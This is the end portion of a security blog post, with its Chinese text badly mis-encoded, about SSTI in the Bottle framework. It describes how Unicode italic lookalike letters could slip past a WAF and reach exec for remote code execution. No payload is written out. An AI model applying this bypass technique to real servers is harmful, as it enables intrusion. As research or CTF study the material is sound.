<p>getï¼ˆpostï¼‰ä¼ å‚ç‰¹æ®Šå­—ç¬¦å¿…é¡»è¿›è¡ŒURLç¼–ç çš„åŸå› ï¼Œå› æ­¤æˆ‘ä»¬æ˜¯æ— æ³•ä¼ å…¥è¿™ç§æ–œä½“å­—ç¬¦çš„ã€‚ä½†æ˜¯å‡è®¾é¶æœºæä¾›äº†ä¸€ç§å¯ä»¥ä¸ä½¿ç”¨URLç¼–ç çš„æ–¹å¼å°†å¯æ§è¾“å…¥ä¼ å…¥templateï¼ˆå¦‚ï¼šä¸Šä¼ æ–‡ä»¶ï¼Œå†æ¸²æŸ“æ–‡ä»¶ä¸­çš„å†…å®¹å½¢æˆçš„SSTIï¼‰é‚£å°±æ„å‘³ç€æ‰€æœ‰çš„å­—ç¬¦å¯ä»¥å…¨éƒ¨ç”¨å„ç§æ–œä½“æ›¿æ¢ï¼ˆæ˜¯çš„ï¼Œä¸€ä¸ªASCIIçš„æ–œä½“å­—ç¬¦è‡³å°‘4ç§ï¼‰ï¼Œé‚£å°±çœŸçš„è¶…æ¨¡äº†ã€‚</p>
<p>å¯¹äºä»»æ„ASCIIå­—æ¯éƒ½è‡³å°‘å¯ä»¥åœ¨<a target="_blank" rel="noopener" href="https://exotictext.com/zh-cn/italic/%E4%B8%8A%E6%89%BE%E5%88%B0%E5%9B%9B%E7%A7%8D%E5%AF%B9%E5%BA%94%E7%9A%84%E6%96%9C%E4%BD%93%E3%80%82%E5%9C%A8python%E4%B8%AD%E9%83%BD%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%BD%93%E6%88%90ASCII%E6%AD%A3%E5%B8%B8%E6%89%A7%E8%A1%8C%E3%80%82%E5%81%87%E8%AE%BE%E6%88%91%E4%BB%AC%E8%83%BD%E6%8A%8A%E8%BF%99%E4%BA%9B%E4%B8%9C%E8%A5%BF%E4%BC%A0%E5%88%B0%E5%90%8E%E7%AB%AF%EF%BC%8C%E4%B8%8D%E4%BC%9A%E8%A7%A6%E5%8F%91%E9%92%88%E5%AF%B9%E8%AF%A5%E5%AD%97%E7%AC%A6%E7%9A%84waf%EF%BC%8Cbottle%E6%B8%B2%E6%9F%93%E5%AE%8C%E6%88%90%E5%90%8E%E5%B0%B1%E4%BC%9A%E7%9B%B4%E6%8E%A5%E8%BF%9B%E5%85%A5exec%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%AD%A3%E5%B8%B8RCE%E3%80%82">https://exotictext.com/zh-cn/italic/ä¸Šæ‰¾åˆ°å››ç§å¯¹åº”çš„æ–œä½“ã€‚åœ¨pythonä¸­éƒ½å¯ä»¥ç›´æ¥å½“æˆASCIIæ­£å¸¸æ‰§è¡Œã€‚å‡è®¾æˆ‘ä»¬èƒ½æŠŠè¿™äº›ä¸œè¥¿ä¼ åˆ°åç«¯ï¼Œä¸ä¼šè§¦å‘é’ˆå¯¹è¯¥å­—ç¬¦çš„wafï¼Œbottleæ¸²æŸ“å®Œæˆåå°±ä¼šç›´æ¥è¿›å…¥execï¼Œå¯ä»¥æ­£å¸¸RCEã€‚</a></p>
<p>å‚è€ƒæ–‡ç« ï¼š</p>
<p>æ‹‰è’™ç‰¹å¾å®å­</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/18805019">https://www.cnblogs.com/LAMENTXU/articles/18805019</a></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Meteor_Kai</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://meteorkai.github.io/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">http://meteorkai.github.io/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>CyberSecurity brings me great joy!</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/Python%E6%A1%86%E6%9E%B6/"># Pythonæ¡†æ¶</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>Â· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2025/04/09/XYCTF2025-Web-wp/">XYCTF2025 Web wp</a>
            
            
            <a class="next" rel="next" href="/2025/04/07/NCTF2024-web-wp/">NCTF2024 web wp</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>Â© Meteor_Kai | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>